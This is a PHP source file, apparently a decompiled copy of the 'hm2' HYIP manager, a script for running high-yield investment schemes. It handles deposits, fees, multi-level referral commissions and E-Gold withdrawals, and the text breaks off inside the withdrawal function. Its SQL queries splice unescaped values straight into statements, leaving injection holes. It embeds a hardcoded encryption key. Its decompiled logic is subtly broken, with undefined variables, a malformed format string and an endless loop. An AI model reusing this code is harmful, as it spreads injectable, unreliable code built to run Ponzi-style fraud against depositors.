<?php
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


function elnlcajrqt( $elnlcVcqgw )
{
    $elnlcQwChW = array( );
    if ( preg_match( "/\\[default\\](.*?)\\[\\/default\\]/", $elnlcVcqgw, $elnlcQwChW ) )
    {
        $elnlcVcqgw = $elnlcQwChW[1];
    }
    return $elnlcVcqgw;
}

function elnlcvlns( $elnlcVcqgw, $elnlcrTjI, $d )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = ( $elnlcVcqgw + 48273 ) % $elnlcrTjI;
    $elnlcNGihV = $elnlcbhAzL['elnlcSFKV'];
    $elnlcHxWu = $elnlcVRAGE;
    while ( $elnlcNGihV == 0 )
    {
        if ( $d[$elnlcVRAGE] != -1 )
        {
            ++$elnlcVRAGE;
            if ( $elnlcVRAGE == $elnlcrTjI )
            {
                $elnlcVRAGE = $elnlcbhAzL['elnlcSFKV'];
            }
        }
        else
        {
            $elnlcNGihV = $elnlcbhAzL['elnlcRlJry'];
        }
    }
    return $elnlcVRAGE;
}

function elnlctiie( $elnlcVcqgw, $elnlcrTjI, $d )
{
    global $elnlcbhAzL;
    $elnlcVRAGE = ( $elnlcVcqgw + 48273 ) % $elnlcrTjI;
    $elnlcNGihV = $elnlcbhAzL['elnlcSFKV'];
    while ( !$elnlcNGihV )
    {
        if ( $d[$elnlcVRAGE] == -1 )
        {
            ++$elnlcVRAGE;
            if ( $elnlcVRAGE == $elnlcrTjI )
            {
                $elnlcVRAGE = $elnlcbhAzL['elnlcSFKV'];
            }
        }
        else
        {
            $elnlcNGihV = $elnlcbhAzL['elnlcRlJry'];
        }
    }
    return $elnlcVRAGE;
}

function elnlccifcf( )
{
    global $elnlcbhAzL;
    if ( !defined( "THE_GC_SCRIPT_V2005_04_01" ) )
    {
        print "Please use only original script";
        exit( );
    }
    global $elnlcplSDU;
    global $elnlctVnzQ;
    $q = "select * from hm2_users where id = 1";
    if ( !( $elnlcRLPe = mysql_query( $q ) ) )
    {
    }
    $elnlcTrBb = array( );
    while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
    {
        $elnlcTrBb = array( );
        $z = elnlcbeub( $elnlcPSitf[$elnlcbhAzL['elnlcexer']], "&hd,mnf(fska\$d3jlkfsda".$elnlctVnzQ[$elnlcbhAzL['elnlckWIL']] );
        $elnlcTrBb = unserialize( $z );
    }
    return $elnlcTrBb;
}

function elnlcxguuw( )
{
    global $elnlcbhAzL;
    if ( !defined( "THE_GC_SCRIPT_V2005_04_01" ) )
    {
        print "Please use only original script";
        exit( );
    }
    global $elnlcplSDU;
    global $elnlcORFbM;
    global $elnlctVnzQ;
    $z = elnlcdjxb( elnlcqnsm( serialize( $elnlcORFbM ), "&hd,mnf(fska\$d3jlkfsda".$elnlctVnzQ[$elnlcbhAzL['elnlckWIL']] ) );
    $q = "update hm2_users set ac = '{$z}' where id = 1";
    if ( !mysql_query( $q ) )
    {
    }
    return;
}

function elnlcqekq( $elnlcJwMUI, $elnlcjvTJB, $elnlcekLao, $elnlcUqhml, $elnlcJfxRK, $elnlcVRHf, $elnlcBKqrM )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    global $elnlcjxPh;
    $elnlcBKqrM = intval( $elnlcBKqrM );
    $elnlcVRHf = intval( $elnlcVRHf );
    $elnlcjvTJB = intval( $elnlcjvTJB );
    $elnlcekLao = sprintf( "%.02f", $elnlcekLao );
    $elnlccoxvL = elnlcdjxb( $elnlcUqhml );
    $elnlcoruy = $elnlcbhAzL['elnlcSFKV'];
    $q = "select count(id) as cnt from hm2_history where ec = {$elnlcJwMUI} && type = 'add_funds' && description like '%Batch id = {$elnlccoxvL}'";
    $elnlcRLPe = mysql_query( $q );
    $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
    if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcWJeyC']] )
    {
        $elnlcoruy = $elnlcbhAzL['elnlcRlJry'];
    }
    if ( $elnlcoruy == 1 )
    {
        return 0;
    }
    $elnlcrTos = "Add funds to account from ".$elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']].". Batch id = {$elnlcUqhml}";
    if ( $elnlcJwMUI == 4 && $elnlctVnzQ[$elnlcbhAzL['elnlcTDOf']] == 1 )
    {
        $elnlcrTos = "Add funds to account from ".$elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']]." {$elnlcekLao} - StormPay Fee. Batch id = {$elnlcUqhml}";
        $elnlcekLao = $elnlcekLao - $elnlcekLao * 6.9 / 100 - 0.69;
    }
    else if ( $elnlcJwMUI == 4 && $elnlctVnzQ[$elnlcbhAzL['elnlctatVy']] == 1 )
    {
        $elnlcrTos = "Add funds to account from ".$elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']]." {$elnlcekLao} - StormPay Fee. Batch id = {$elnlcUqhml}";
        $elnlcekLao = $elnlcekLao - $elnlcekLao * 2.9 / 100 - 0.39;
    }
    if ( 0 < $elnlctVnzQ[$elnlcbhAzL['elnlcBOndW']] )
    {
        $elnlcMKoE = sprintf( "%0.2", $elnlcekLao * $elnlctVnzQ[$elnlcbhAzL['elnlcBOndW']] / 100 );
        if ( $elnlcMKoE < $elnlctVnzQ[$elnlcbhAzL['elnlcxJkh']] )
        {
            $elnlcMKoE = $elnlctVnzQ[$elnlcbhAzL['elnlcxJkh']];
        }
        $elnlcekLao = $elnlcekLao - $elnlcMKoE;
        $elnlcrTos .= ". Deposit fee - {$elnlcMKoE}";
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcnzRUV'] )
    {
        $elnlcJwMUI = $elnlcbhAzL['elnlcRIBmz'];
    }
    $q = "insert into hm2_history set \r\n        \tuser_id = {$elnlcjvTJB},\r\n        \tamount = '{$elnlcekLao}',\r\n        \ttype = 'add_funds',\r\n        \tdescription = '{$elnlcrTos}',\r\n        \tactual_amount = {$elnlcekLao},\r\n        \tec = {$elnlcJwMUI},\r\n        \tdate = now()    \r\n        \t";
    if ( !mysql_query( $q ) )
    {
    }
    $q = "select * from hm2_types where id = {$elnlcVRHf}";
    if ( !( $elnlcRLPe = mysql_query( $q ) ) )
    {
    }
    $elnlcoBmuw = "";
    $elnlcdBkj = mysql_fetch_array( $elnlcRLPe );
    $elnlcDIbqv = -1;
    if ( $elnlcdBkj )
    {
        $elnlcDIbqv += $elnlcPSitf[$elnlcbhAzL['elnlcrplh']];
        $elnlcoBmuw = elnlcdjxb( $elnlcdBkj[$elnlcbhAzL['elnlcPeWJ']] );
        if ( $elnlcdBkj[$elnlcbhAzL['elnlcVcEzr']] == 0 )
        {
            $elnlcBKqrM = $elnlcbhAzL['elnlcSFKV'];
        }
        else
        {
            if ( $elnlcdBkj[$elnlcbhAzL['elnlcvpTI']] == 0 )
            {
                $elnlcdBkj[$elnlcbhAzL['elnlcvpTI']] = $elnlcekLao + 1;
            }
            if ( $elnlcdBkj[$elnlcbhAzL['elnlcfVHWz']] <= $elnlcekLao && $elnlcekLao <= $elnlcdBkj[$elnlcbhAzL['elnlcvpTI']] )
            {
                if ( $elnlcdBkj[$elnlcbhAzL['elnlcQaJPf']] == 1 )
                {
                    $elnlcBtEC = preg_split( "/\\s*,\\s*/", $elnlcdBkj[$elnlcbhAzL['elnlcUwMaB']] );
                    if ( !in_array( $elnlcBKqrM, $elnlcBtEC ) )
                    {
                        $elnlcBKqrM = $elnlcBtEC[0];
                    }
                }
                else
                {
                    if ( $elnlcBKqrM < $elnlcdBkj[$elnlcbhAzL['elnlcpFPq']] )
                    {
                        $elnlcBKqrM = $elnlcdBkj[$elnlcbhAzL['elnlcpFPq']];
                    }
                    if ( $elnlcdBkj[$elnlcbhAzL['elnlcscIHA']] < $elnlcBKqrM )
                    {
                        $elnlcBKqrM = $elnlcdBkj[$elnlcbhAzL['elnlcscIHA']];
                    }
                }
            }
            else
            {
                $elnlcBKqrM = $elnlcbhAzL['elnlcSFKV'];
            }
        }
    }
    if ( $elnlcDIbqv < 0 )
    {
        $elnlcDIbqv = $elnlcbhAzL['elnlcSFKV'];
    }
    $q = "select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = {$elnlcVRHf}";
    $elnlcHAEbv = mysql_query( $q );
    $elnlcukjg = mysql_fetch_array( $elnlcHAEbv );
    $elnlcosOT = $elnlcukjg[$elnlcbhAzL['elnlcqvyE']];
    $elnlcmLamp = $elnlcukjg[$elnlcbhAzL['elnlcUILPA']];
    if ( $elnlcosOT <= $elnlcekLao && $elnlcekLao <= $elnlcmLamp )
    {
        $q = "insert into hm2_deposits set\r\n          \tuser_id = {$elnlcjvTJB},\r\n          \ttype_id = {$elnlcVRHf},\r\n          \tdeposit_date = now(),\r\n          \tlast_pay_date = now()+ interval {$elnlcDIbqv} day,\r\n          \tstatus = 'on',\r\n          \tq_pays = 0,\r\n          \tamount = '{$elnlcekLao}',\r\n          \tactual_amount = '{$elnlcekLao}',\r\n          \tec = {$elnlcJwMUI},\r\n          \tcompound = {$elnlcBKqrM}\r\n          \t";
        if ( !mysql_query( $q ) )
        {
        }
        $elnlcqaqH = mysql_insert_id( );
        $q = "insert into hm2_history set \r\n          \tuser_id = {$elnlcjvTJB},\r\n          \tamount = '-{$elnlcekLao}',\r\n          \ttype = 'deposit',\r\n          \tdescription = 'Deposit to ".elnlcdjxb( $elnlcoBmuw )."',\r\n          \tactual_amount = -{$elnlcekLao},\r\n          \tec = {$elnlcJwMUI},\r\n          \tdate = now(),\r\n                deposit_id = {$elnlcqaqH}\r\n          \t";
        if ( !mysql_query( $q ) )
        {
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcMLNqH'] )
        {
            $q = "update hm2_users set reset = 0 where id = {$elnlcphLLu[$elnlcbhAzL['elnlcIGomq']]}";
            mysql_query( $q );
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcVntbh'] )
        {
            $q = "select count(id) as col from hm2_deposits where user_id = {$elnlcjvTJB}";
            if ( !( $elnlcRLPe = mysql_query( $q ) ) )
            {
            }
            $elnlcWhko = $elnlcbhAzL['elnlcSFKV'];
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcWhko = $elnlcPSitf[$elnlcbhAzL['elnlczFIa']];
            }
            $q = "select count(distinct user_id) as col from hm2_deposits";
            if ( !( $elnlcRLPe = mysql_query( $q ) ) )
            {
            }
            $elnlcHESP = $elnlcbhAzL['elnlctsvUN'];
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcHESP = $elnlcPSitf[$elnlcbhAzL['elnlczFIa']];
            }
            if ( $elnlcWhko == 1 && $elnlcHESP <= 500 )
            {
                $q = "insert into hm2_history set\r\n  \tuser_id = {$elnlcjvTJB},\r\n  \tamount = 2,\r\n  \ttype = 'bonus',\r\n  \tdescription = 'Bonus',\r\n  \tactual_amount = 2,\r\n  \tec = {$elnlcJwMUI},\r\n  \tdate = now()";
                if ( !mysql_query( $q ) )
                {
                }
            }
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcVDVDy']] == 1 )
        {
            $elnlcVropP = $elnlcbhAzL['elnlcSFKV'];
            if ( 0 < $elnlctVnzQ[$elnlcbhAzL['elnlcAoin']] )
            {
                $elnlcVropP = $elnlcekLao * 1000 / $elnlctVnzQ[$elnlcbhAzL['elnlcAoin']];
            }
            if ( 0 < $elnlcVropP )
            {
                $q = "update hm2_users set imps = imps + {$elnlcVropP} where id = {$elnlcjvTJB}";
                if ( !mysql_query( $q ) )
                {
                }
            }
        }
        $elnlcitvh = elnlctvfsj( $elnlcjvTJB, $elnlcekLao, $elnlcJwMUI );
    }
    else
    {
        $elnlcoBmuw = "Deposit to Account";
    }
    $q = "select * from hm2_users where id = {$elnlcjvTJB}";
    $elnlcRLPe = mysql_query( $q );
    $elnlcxqdJl = mysql_fetch_array( $elnlcRLPe );
    $elnlcVnhFk = array( $elnlcxqdJl );
    $elnlcVnhFk[$elnlcbhAzL['elnlclrlET']] = $elnlcxqdJl[$elnlcbhAzL['elnlclrlET']];
    $elnlcVnhFk[$elnlcbhAzL['elnlcPeWJ']] = $elnlcxqdJl[$elnlcbhAzL['elnlcPeWJ']];
    $elnlcVnhFk[$elnlcbhAzL['elnlclEcuA']] = number_format( $elnlcekLao, 2 );
    $elnlcVnhFk[$elnlcbhAzL['elnlcKfiHR']] = $elnlcJfxRK;
    $elnlcVnhFk[$elnlcbhAzL['elnlclmhFR']] = $elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']];
    $elnlcVnhFk[$elnlcbhAzL['elnlccDio']] = $elnlcUqhml;
    $elnlcVnhFk[$elnlcbhAzL['elnlcuhKmr']] = $elnlcBKqrM;
    $elnlcVnhFk[$elnlcbhAzL['elnlcmjsrD']] = elnlcajrqt( $elnlcoBmuw );
    $elnlcVnhFk[$elnlcbhAzL['elnlcItylv']] = $elnlcitvh;
    $elnlcVnhFk[$elnlcbhAzL['elnlcKlvTq']] = "[no upline]";
    if ( 0 < $elnlcxqdJl[$elnlcbhAzL['elnlcJQPVe']] )
    {
        $q = "select * from hm2_users where id = {$elnlcxqdJl[$elnlcbhAzL['elnlcJQPVe']]}";
        if ( !( $elnlcRLPe = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
        {
            $elnlcVnhFk[$elnlcbhAzL['elnlcKlvTq']] = $elnlcPSitf[$elnlcbhAzL['elnlclrlET']];
        }
    }
    $q = "select email from hm2_users where id = 1";
    $elnlcRLPe = mysql_query( $q );
    $elnlciHSW = "";
    while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
    {
        $elnlciHSW = $elnlcPSitf[$elnlcbhAzL['elnlcRgzM']];
    }
    elnlcrsmm( "deposit_admin_notification", $elnlciHSW, $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlcVnhFk );
    elnlcrsmm( "deposit_user_notification", $elnlcxqdJl[email], $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlcVnhFk );
    return 1;
}

function elnlctvfsj( $elnlcjvTJB, $elnlcekLao, $elnlcJwMUI )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    global $elnlcjxPh;
    $q = "select * from hm2_users where id = {$elnlcjvTJB}";
    $elnlcaaeLg = mysql_query( $q );
    $elnlclcxkm = mysql_fetch_array( $elnlcaaeLg );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcnzRUV'] )
    {
        $elnlcEGDR = $elnlcHtbM[$elnlcbhAzL['elnlcJQPVe']];
        $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlcEGDR}";
        $elnlcRLPe = mysql_query( $q );
        $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
        if ( $elnlcPSitf[$elnlcbhAzL['elnlcWJeyC']] <= 0 )
        {
            return 0;
        }
        $q = "select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = 'on' and u.ref = {$elnlcEGDR}";
        $elnlcRLPe = mysql_query( $q );
        $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
        if ( $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] < 3000 )
        {
            $elnlcWsKAT = $elnlcbhAzL['elnlcSFKV'];
            return 0;
        }
        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] < 6000 )
        {
            $elnlcWsKAT = 0.02;
        }
        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] < 12000 )
        {
            $elnlcWsKAT = 0.05;
        }
        else
        {
            $elnlcWsKAT = 0.1;
        }
        $elnlcsHAa = $elnlcekLao * $elnlcWsKAT;
        $q = "insert into hm2_history set\r\n      \tuser_id = {$elnlcEGDR},\r\n      \tamount = {$elnlcsHAa},\r\n      \tactual_amount = {$elnlcsHAa},\r\n      \ttype = 'commissions',\r\n      \tdescription = 'Referral commission from ".elnlcdjxb( $elnlclcxkm[$elnlcbhAzL['elnlclrlET']] )."',\r\n      \tec = {$elnlcJwMUI},\r\n      \tdate = now()";
        if ( !mysql_query( $q ) )
        {
        }
        $q = "select * from hm2_users where id = {$elnlcEGDR}";
        $elnlcaaeLg = mysql_query( $q );
        $elnlczyTi = mysql_fetch_array( $elnlcaaeLg );
        $elnlczyTi[$elnlcbhAzL['elnlclEcuA']] = number_format( $elnlcsHAa, 2 );
        $elnlczyTi[$elnlcbhAzL['elnlcJwWF']] = $elnlclcxkm[$elnlcbhAzL['elnlclrlET']];
        $elnlczyTi[$elnlcbhAzL['elnlczJUVU']] = $elnlclcxkm[$elnlcbhAzL['elnlcPeWJ']];
        $elnlczyTi[$elnlcbhAzL['elnlclmhFR']] = $elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']];
        elnlcrsmm( "referral_commision_notification", $elnlczyTi[$elnlcbhAzL['elnlcRgzM']], $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlczyTi );
    }
    $elnlcitvh = $elnlcbhAzL['elnlcSFKV'];
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcmOuO']] == 1 )
    {
        $elnlcEGDR = $elnlcbhAzL['elnlcSFKV'];
        if ( 0 < $elnlclcxkm[$elnlcbhAzL['elnlcJQPVe']] )
        {
            $elnlcEGDR = $elnlclcxkm[$elnlcbhAzL['elnlcJQPVe']];
        }
        else
        {
            return 0;
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcOaGaB']] )
        {
            $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlcEGDR}";
            $elnlcRLPe = mysql_query( $q );
            $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
            if ( $elnlcPSitf[$elnlcbhAzL['elnlcWJeyC']] <= 0 )
            {
                return 0;
            }
        }
        if ( 0 < $elnlctVnzQ[$elnlcbhAzL['elnlcWzLe']] && $elnlcekLao < $elnlctVnzQ[$elnlcbhAzL['elnlcWzLe']] )
        {
            return 0;
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcITqU']] == 1 )
        {
            if ( 0 < $elnlctVnzQ[$elnlcbhAzL['elnlcKqfVO']] )
            {
                $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlcjvTJB}";
                $elnlcRLPe = mysql_query( $q );
                $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
                if ( $elnlcPSitf[$elnlcbhAzL['elnlcWJeyC']] == 1 )
                {
                    $elnlcsHAa = $elnlctVnzQ[$elnlcbhAzL['elnlcKqfVO']];
                    $elnlcitvh += $elnlcsHAa;
                    $q = "insert into hm2_history set\r\n    \t\tuser_id = {$elnlcEGDR},\r\n    \t\tamount = {$elnlcsHAa},\r\n    \t\tactual_amount = {$elnlcsHAa},\r\n    \t\ttype = 'commissions',\r\n    \t\tdescription = 'Referral commission from ".elnlcdjxb( $elnlclcxkm[$elnlcbhAzL['elnlclrlET']] )."',\r\n    \t\tec = {$elnlcJwMUI},\r\n    \t\tdate = now()";
                    if ( !mysql_query( $q ) )
                    {
                    }
                    $q = "select * from hm2_users where id = {$elnlcEGDR}";
                    $elnlcaaeLg = mysql_query( $q );
                    $elnlczyTi = mysql_fetch_array( $elnlcaaeLg );
                    $elnlczyTi[$elnlcbhAzL['elnlclEcuA']] = number_format( $elnlcsHAa, 2 );
                    $elnlczyTi[$elnlcbhAzL['elnlcJwWF']] = $elnlclcxkm[$elnlcbhAzL['elnlclrlET']];
                    $elnlczyTi[$elnlcbhAzL['elnlczJUVU']] = $elnlclcxkm[$elnlcbhAzL['elnlcPeWJ']];
                    $elnlczyTi[$elnlcbhAzL['elnlclmhFR']] = $elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']];
                    elnlcrsmm( "referral_commision_notification", $elnlczyTi[$elnlcbhAzL['elnlcRgzM']], $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlczyTi );
                }
            }
        }
        else
        {
            if ( $elnlctVnzQ[$elnlcbhAzL['elnlcSgGnA']] == 1 )
            {
                $q = "select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = {$elnlcEGDR} and hm2_deposits.user_id = hm2_users.id";
            }
            else
            {
                $q = "select count(id) as col from hm2_users where ref = {$elnlcEGDR}";
            }
            $elnlcRLPe = mysql_query( $q );
            if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcTwJCd = $elnlcPSitf[$elnlcbhAzL['elnlczFIa']];
                $q = "select * from hm2_users where id = {$elnlcEGDR}";
                $elnlcaaeLg = mysql_query( $q );
                $elnlcjLfnx = mysql_fetch_array( $elnlcaaeLg );
                $elnlcAUqB = @unserialize( @$elnlcjLfnx[$elnlcbhAzL['elnlcPeDF']] );
                if ( isset( $elnlcAUqB[$elnlcbhAzL['elnlcufufz']] ) )
                {
                    $j = $elnlcbhAzL['elnlcRlJry'];
                    while ( isset( $elnlcAUqB["ref_percent".$j] ) )
                    {
                        if ( $elnlcAUqB["ref_percent".$j][0] <= $elnlcTwJCd && $elnlcTwJCd <= $elnlcAUqB["ref_percent".$j][1] )
                        {
                            $elnlcsHAa = $elnlcekLao * $elnlcAUqB["ref_percent".$j][2] / 100;
                            $elnlcitvh += $elnlcsHAa;
                            break;
                        }
                        ++$j;
                    }
                }
                else if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcGDIz'] )
                {
                    $q = "select sum(amount) as amnt from hm2_deposits where user_id = {$elnlcEGDR}";
                    $elnlcRLPe = mysql_query( $q );
                    $elnlcPSitf = mysql_fetch_array( $elnlcRLPe );
                    $elnlcWsKAT = $elnlcbhAzL['elnlcSFKV'];
                    if ( 10000 <= $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] )
                    {
                        $elnlcWsKAT = $elnlcbhAzL['elnlcVRSu'];
                    }
                    else if ( 5000 <= $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] )
                    {
                        $elnlcWsKAT = $elnlcbhAzL['elnlcHFgU'];
                    }
                    else if ( 3000 <= $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] )
                    {
                        $elnlcWsKAT = $elnlcbhAzL['elnlcEEGh'];
                    }
                    else if ( 1000 <= $elnlcPSitf[$elnlcbhAzL['elnlcusqu']] )
                    {
                        $elnlcWsKAT = $elnlcbhAzL['elnlcGavBh'];
                    }
                    if ( 0 < $elnlcWsKAT )
                    {
                        if ( 4 <= $elnlcTwJCd )
                        {
                            $elnlcWsKAT += 3;
                        }
                        $elnlcsHAa = $elnlcekLao * $elnlcWsKAT / 100;
                        $elnlcitvh += $elnlcsHAa;
                        $q = "insert into hm2_history set\r\n    \t\tuser_id = {$elnlcEGDR},\r\n    \t\tamount = {$elnlcsHAa},\r\n    \t\tactual_amount = {$elnlcsHAa},\r\n    \t\ttype = 'commissions',\r\n    \t\tdescription = 'Referral commission from ".elnlcdjxb( $elnlclcxkm[$elnlcbhAzL['elnlclrlET']] )."',\r\n    \t\tec = {$elnlcJwMUI},\r\n     \t\tdate = now()";
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                }
                else
                {
                    $q = "select percent from hm2_referal where from_value <= {$elnlcTwJCd} and (to_value >= {$elnlcTwJCd} or to_value = 0) order by from_value desc limit 1";
                    if ( !( $elnlcRLPe = mysql_query( $q ) ) )
                    {
                    }
                    if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                    {
                        $elnlcsHAa = $elnlcekLao * $elnlcPSitf[$elnlcbhAzL['elnlcgFxbx']] / 100;
                        $elnlcitvh += $elnlcsHAa;
                        $q = "insert into hm2_history set\r\n    \t\tuser_id = {$elnlcEGDR},\r\n    \t\tamount = {$elnlcsHAa},\r\n    \t\tactual_amount = {$elnlcsHAa},\r\n    \t\ttype = 'commissions',\r\n    \t\tdescription = 'Referral commission from ".elnlcdjxb( $elnlclcxkm[$elnlcbhAzL['elnlclrlET']] )."',\r\n    \t\tec = {$elnlcJwMUI},\r\n     \t\tdate = now()";
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                }
                $q = "select * from hm2_users where id = {$elnlcEGDR}";
                $elnlcaaeLg = mysql_query( $q );
                $elnlczyTi = mysql_fetch_array( $elnlcaaeLg );
                $elnlczyTi[$elnlcbhAzL['elnlclEcuA']] = number_format( $elnlcsHAa, 2 );
                $elnlczyTi[$elnlcbhAzL['elnlcJwWF']] = $elnlclcxkm[$elnlcbhAzL['elnlclrlET']];
                $elnlczyTi[$elnlcbhAzL['elnlczJUVU']] = $elnlclcxkm[$elnlcbhAzL['elnlcPeWJ']];
                $elnlczyTi[$elnlcbhAzL['elnlclmhFR']] = $elnlcjxPh[$elnlcJwMUI][$elnlcbhAzL['elnlcPeWJ']];
                elnlcrsmm( "referral_commision_notification", $elnlczyTi[$elnlcbhAzL['elnlcRgzM']], $elnlctVnzQ[$elnlcbhAzL['elnlcjjeps']], $elnlczyTi );
            }
        }
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcITqU']] != 1 )
        {
            $i = $elnlcbhAzL['elnlccVEB'];
            for ( ; $i < 11; ++$i )
            {
                if ( $elnlcEGDR == 0 || $elnlctVnzQ["ref".$i."_cms"] == 0 )
                {
                    break;
                }
                if ( 0 < $elnlctVnzQ["ref".$i."_cms_minamount"] && $elnlcekLao < $elnlctVnzQ["ref".$i."_cms_minamount"] )
                {
                    continue;
                }
                $q = "select * from hm2_users where id = {$elnlcEGDR}";
                $elnlcRLPe = mysql_query( $q );
                $elnlcEGDR = $elnlcbhAzL['elnlcSFKV'];
                do
                {
                    if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                    {
                        $elnlcEGDR = $elnlcPSitf[$elnlcbhAzL['elnlcJQPVe']];
                        if ( 0 < $elnlcEGDR )
                        {
                            $elnlcWNPP = $elnlcbhAzL['elnlcRlJry'];
                            if ( $elnlctVnzQ[$elnlcbhAzL['elnlcOaGaB']] == 1 )
                            {
                                $elnlcWNPP = $elnlcbhAzL['elnlcSFKV'];
                                $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlcEGDR}";
                                $elnlcBywru = mysql_query( $q );
                                $elnlcqGTFr = mysql_fetch_array( $elnlcBywru );
                                if ( 0 < $elnlcqGTFr[$elnlcbhAzL['elnlcWJeyC']] )
                                {
                                    $elnlcWNPP = $elnlcbhAzL['elnlcRlJry'];
                                }
                            }
                            if ( $elnlcWNPP == 1 )
                            {
                                $elnlcsHAa = $elnlcekLao * $elnlctVnzQ["ref".$i."_cms"] / 100;
                                $elnlcitvh += $elnlcsHAa;
                                $q = "insert into hm2_history set\r\n                  user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcJQPVe']].",\r\n                  amount = {$elnlcsHAa},\r\n                  actual_amount = {$elnlcsHAa},\r\n                  type = 'commissions',\r\n                  description = 'Referral commission from ".elnlcdjxb( $elnlclcxkm[$elnlcbhAzL['elnlclrlET']] )." {$i} level referral',\r\n                  ec = {$elnlcJwMUI},\r\n                  date = now()";
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                        }
                    }
                } while ( 1 );
            }
            continue;
        }
    }
    return $elnlcitvh;
}

function elnlchilr( $elnlcJfxRK, $elnlcJwMUI )
{
    global $elnlcbhAzL;
    global $elnlcjxPh;
    $elnlcJwMUI = intval( $elnlcJwMUI );
    $elnlcJfxRK = elnlcdjxb( $elnlcJfxRK );
    $q = "select count(*) as cnt from hm2_pay_settings where n='ext_accounts_blacklist' and v='{$elnlcJwMUI}={$elnlcJfxRK}'";
    $elnlcRLPe = mysql_query( $q );
    $elnlcPSitf = mysql_fetch_assoc( $elnlcRLPe );
    if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcWJeyC']] )
    {
        return array( 0, "Blacklisted ".$elnlcjxPh[$elnlcJwMUI]." account ".$elnlcJfxRK );
    }
    return array( 1, "" );
}

function elnlcgdlk( $elnlcDxIpr, $elnlcekLao, $elnlcJfxRK, $elnlcykqSE, $elnlcstWo )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcTxqa']] == $elnlcbhAzL['elnlcbCzgf'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcfibk']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcJfxRK == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to E-Gold account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid E-Gold account", "" );
    }
    $elnlccwmRh = elnlchilr( $elnlcJfxRK, 0 )[1];
    $elnlcKOsIk = elnlchilr( $elnlcJfxRK, 0 )[0];
    if ( $elnlcKOsIk == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlccwmRh}'";
        mysql_query( $q );
        return array( 0, $elnlccwmRh );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcDxIpr == "" )
        {
            $q = "select v from hm2_pay_settings where n='egold_account_password'";
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
